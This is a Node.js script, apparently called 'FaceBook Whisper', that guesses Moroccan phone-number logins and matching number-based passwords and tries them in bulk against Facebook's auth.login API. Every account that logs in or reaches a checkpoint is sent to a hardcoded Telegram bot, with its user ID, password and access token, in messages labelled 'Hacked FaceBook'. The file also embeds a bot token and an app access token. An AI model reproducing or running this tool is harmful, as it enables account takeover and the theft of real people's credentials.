const axios = require("axios");
const figlet = require("figlet");
const colors = require("colors");
const express = require('express');
const app = express();

app.get('/', (req, res) => {
  res.send('Hello World!');
});

console.clear();
console.log(figlet.textSync('FaceBook') + colors.yellow("Whisper </>\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"));
console.log(`FB: ${colors.cyan('OussamaBakrine')}`);
console.log(colors.yellow("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"));

const ID = '1758975211';
const tok = '7160121436:AAEb846gUsrXPjPTw5t2ERT1zNxqkZzd9nA';
const user = '1234567890';

// دالة تأخير
const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));

async function code_whisper(email, password) {
    const url = 'https://api.facebook.com/method/auth.login';
    const headers = {
        'user-agent': 'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',
        'Accept-Language': 'en-US,en;q=0.5'
    };
    const data = {
        'email': email,
        'password': password,
        'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        'locale': "en_DZ",
        'format': 'JSON'
    };
    const req = await axios.post(url, data, { headers: headers });
    const id = req.data.uid;
    const con = req.data.identifier;
    const tkn = req.data.access_token;
    const tlg = `https://api.telegram.org/bot${tok}/sendMessage?chat_id=${ID}&text=.💀. Hacked FaceBook From @OussamaBakrine💀.\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.❤. ID ==> ${id}\n.✉. User ==> ${email} \n.🚫. Pass ==> ${password}\n.📨. Confirmed user ==> ${con}\n.📃. Access Token ==> ${tkn} \n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.😈`;
    await axios.post(tlg);
    console.log(colors.green(`victim : ${email} | ${password}`));
}

async function processLogin(email, password) {
    const url = 'https://api.facebook.com/method/auth.login';
    const headers = {
        'user-agent': 'Opera/9.80 (Series 60; Opera Mini/7.0.32400/28.3445; U; en) Presto/2.8.119 Version/11.10',
        'Accept-Language': 'en-US,en;q=0.5'
    };
    const data = {
        'email': email,
        'password': password,
        'access_token': "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
        'locale': "en_DZ",
        'format': 'JSON'
    };

    const req = await axios.post(url, data, { headers: headers });
    if ('access_token' in req.data) {
        await code_whisper(email, password);
    } else if (req.data.error_msg.includes('(405)')) {
        console.log(colors.yellow(`CheckPoint ${email}:${password}`));
        await axios.post(`https://api.telegram.org/bot${tok}/sendMessage?chat_id=${ID}&text=.💀.Owner @oussamabakrine💀.\n ︎.ꨄ︎ ––––––––––––––––︎ ꨄ︎.\n.✉. E-mail ==> ${email} \n.🚫. PassWord ==> ${password} \n.ꨄ︎ ––––––––––––––––︎ ꨄ︎. \n.😈 هق مشا.`);
    } else {
        console.log(colors.red(`num => ${email} | pass => ${password}`));
    }
}

async function main() {
    let email, password;

    for (let i = 0; i < 20; i++) {
        // توليد معلومات جديدة
        const whisper = Array.from({ length: 7 }, () => user[Math.floor(Math.random() * user.length)]).join('');
        const newEmail = '+21261' + whisper;
        const newPassword = '061' + whisper;

        // إذا كانت هذه ليست العملية الأولى، نفذ العملية بالمعلومات السابقة بالتزامن مع توليد معلومات جديدة
        if (email && password) {
            processLogin(email, password);
        }

        // تحديث المعلومات للمعلومات الجديدة
        email = newEmail;
        password = newPassword;

        // تأخير ثابت قدره ثانية واحدة بين كل عملية
        await sleep(1000);
    }

    // نفذ العملية الأخيرة بالمعلومات الأخيرة
    if (email && password) {
        processLogin(email, password);
    }
}

main();

app.listen(8080, () => {
  console.log('Server is listening on port 8080');
});
